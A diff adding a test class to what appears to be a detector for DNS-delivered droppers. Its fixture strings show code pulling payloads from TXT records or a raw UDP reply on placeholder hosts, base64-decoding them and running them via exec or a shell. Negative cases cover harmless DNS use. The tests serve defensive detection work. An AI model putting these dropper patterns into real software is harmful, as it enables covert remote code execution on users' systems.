@@ -228,3 +228,57 @@ class TestOrdinaryProgramsOnTheSameChannels:
     def test_a_pipe_read_with_no_size_is_a_local_process(self) -> None:
         source = "import os\ndef worker(conn):\n    os.system(conn.recv())\n"
         assert RunKit.received(source) == []
+
+
+class TestCodeDeliveredOverDns:
+    """A DNS answer is what a name server chose to return: code carried in TXT records, joined and
+    decoded, then run, is a dropper on the DNS channel (tinkoff_cloud_apis_internal 8.5.4 queries
+    TXT over a raw socket, decodes the joined answers and starts what they hold)."""
+
+    def test_txt_records_joined_decoded_and_run(self) -> None:
+        source = (
+            "import base64\n"
+            "import dns.resolver\n"
+            "answer = dns.resolver.resolve('c.example.invalid', 'TXT')\n"
+            "blob = ''.join(r.to_text().strip('\"') for r in answer)\n"
+            "exec(base64.b64decode(blob))\n"
+        )
+        assert RunKit.received(source) == ["received run: exec at=load"]
+
+    def test_a_resolver_object_asked_inside_a_function(self) -> None:
+        source = (
+            "import base64, subprocess\n"
+            "import dns.resolver\n"
+            "def fetch():\n"
+            "    r = dns.resolver.Resolver()\n"
+            "    cmd = base64.b64decode(str(r.resolve('t.example.invalid', 'TXT')[0])).decode()\n"
+            "    subprocess.Popen(cmd, shell=True)\n"
+        )
+        assert RunKit.received(source) == ["received run: subprocess.Popen at=call"]
+
+    def test_a_raw_udp_reply_decoded_and_run(self) -> None:
+        source = (
+            "import base64, socket\n"
+            "s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n"
+            "s.sendto(b'q', ('192.0.2.1', 53))\n"
+            "data, _ = s.recvfrom(4096)\n"
+            "exec(base64.b64decode(data[12:]))\n"
+        )
+        assert RunKit.received(source) == ["received run: exec at=load"]
+
+    def test_a_tool_that_prints_txt_records_is_not(self) -> None:
+        source = (
+            "import dns.resolver\n"
+            "for r in dns.resolver.resolve('example.invalid', 'TXT'):\n"
+            "    print(r.to_text())\n"
+        )
+        assert RunKit.received(source) == []
+
+    def test_an_address_lookup_used_to_connect_is_not(self) -> None:
+        source = (
+            "import socket\n"
+            "import dns.resolver\n"
+            "ip = str(dns.resolver.resolve('db.example.invalid', 'A')[0])\n"
+            "socket.create_connection((ip, 5432))\n"
+        )
+        assert RunKit.received(source) == []
